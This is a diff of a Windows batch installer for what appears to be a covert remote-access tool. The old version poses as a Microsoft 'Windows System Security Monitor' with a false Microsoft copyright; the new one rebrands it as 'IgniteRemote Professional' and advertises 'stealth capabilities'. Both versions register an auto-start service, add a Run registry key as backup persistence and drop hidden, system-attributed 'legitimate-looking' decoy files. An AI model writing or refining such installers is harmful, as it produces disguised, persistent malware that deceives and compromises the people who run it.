@@ -1,8 +1,8 @@
 @echo off
-REM Windows System Security Monitor Installation
-REM Copyright (c) Microsoft Corporation
+REM IgniteRemote Professional Installation
+REM Enterprise Remote Desktop Solution
 
-echo Installing Windows System Security Monitor...
+echo Installing IgniteRemote Professional Service...
 echo.
 
 REM Check if running as administrator
@@ -17,49 +17,49 @@ if %errorLevel% == 0 (
 )
 
 REM Create service directory
-if not exist "%ProgramFiles%\WindowsSecurityMonitor" (
-    mkdir "%ProgramFiles%\WindowsSecurityMonitor"
+if not exist "%ProgramFiles%\IgniteRemote" (
+    mkdir "%ProgramFiles%\IgniteRemote"
 )
 
 REM Copy files to service directory
 echo Copying service files...
-copy /Y "*.py" "%ProgramFiles%\WindowsSecurityMonitor\" >nul
-copy /Y "requirements.txt" "%ProgramFiles%\WindowsSecurityMonitor\" >nul
+copy /Y "*.py" "%ProgramFiles%\IgniteRemote\" >nul
+copy /Y "requirements.txt" "%ProgramFiles%\IgniteRemote\" >nul
 
 REM Install Python packages
 echo Installing required components...
 pip install -r requirements.txt >nul 2>&1
 
 REM Create and install Windows service
-echo Registering Windows service...
-sc create "WindowsSecurityMonitor" ^
-   binPath= "python \"%ProgramFiles%\WindowsSecurityMonitor\service_runner.py\"" ^
+echo Registering IgniteRemote service...
+sc create "IgniteRemoteProfessional" ^
+   binPath= "python \"%ProgramFiles%\IgniteRemote\service_runner.py\"" ^
    start= auto ^
-   DisplayName= "Windows System Security Monitor" ^
-   description= "Monitors system security events and provides real-time protection updates for Windows systems."
+   DisplayName= "IgniteRemote Professional Service" ^
+   description= "Enterprise-grade remote desktop solution with advanced security and stealth capabilities."
 
 REM Set service to auto-start
-sc config "WindowsSecurityMonitor" start= auto
+sc config "IgniteRemoteProfessional" start= auto
 
 REM Start the service
 echo Starting service...
-sc start "WindowsSecurityMonitor"
+sc start "IgniteRemoteProfessional"
 
 REM Add to startup (backup method)
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
-    /v "WindowsSecurityMonitor" ^
+    /v "IgniteRemoteProfessional" ^
     /t REG_SZ ^
-    /d "python \"%ProgramFiles%\WindowsSecurityMonitor\service_runner.py\"" ^
+    /d "python \"%ProgramFiles%\IgniteRemote\service_runner.py\"" ^
     /f >nul
 
 REM Create legitimate-looking files
-echo Windows System Security Monitor > "%TEMP%\sysmonitor.cache"
-echo Copyright (c) Microsoft Corporation >> "%TEMP%\sysmonitor.cache"
-attrib +H +S "%TEMP%\sysmonitor.cache"
+echo IgniteRemote Professional v2.0 > "%TEMP%\ignitecache.tmp"
+echo Enterprise Remote Desktop Solution >> "%TEMP%\ignitecache.tmp"
+attrib +H +S "%TEMP%\ignitecache.tmp"
 
 echo.
 echo Installation completed successfully.
-echo Windows System Security Monitor is now running as a system service.
+echo IgniteRemote Professional is now running as a system service.
 echo.
 echo Service will start automatically on system boot.
 echo To manage the service, use Windows Services (services.msc)
